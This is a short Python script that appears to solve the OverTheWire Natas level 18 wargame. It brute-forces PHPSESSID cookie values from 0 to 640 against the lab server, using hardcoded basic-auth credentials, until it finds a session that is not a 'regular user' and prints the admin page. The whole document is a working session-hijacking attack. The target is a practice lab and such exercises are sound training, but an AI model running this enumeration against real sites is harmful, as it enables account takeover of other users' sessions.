import requests, string
from time import *

AUTH=requests.auth.HTTPBasicAuth('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
URL = "http://natas18.natas.labs.overthewire.org"

cookie_value = 0

while True:
  if cookie_value > 640:
    print("Tried all cookie values...")
    break
  
  cookies = {'PHPSESSID': str(cookie_value)}
  print("\nTrying with cookie: ", str(cookies))
  response = requests.get(URL, auth=AUTH, cookies=cookies)
  
  if "You are logged in as a regular user" in response.text:
    print("Cookie " + str(cookie_value) + " is not correct")
  else:
    print("Correct admin cookie with value " + str(cookie_value))
    print(response.text)
    break
  cookie_value += 1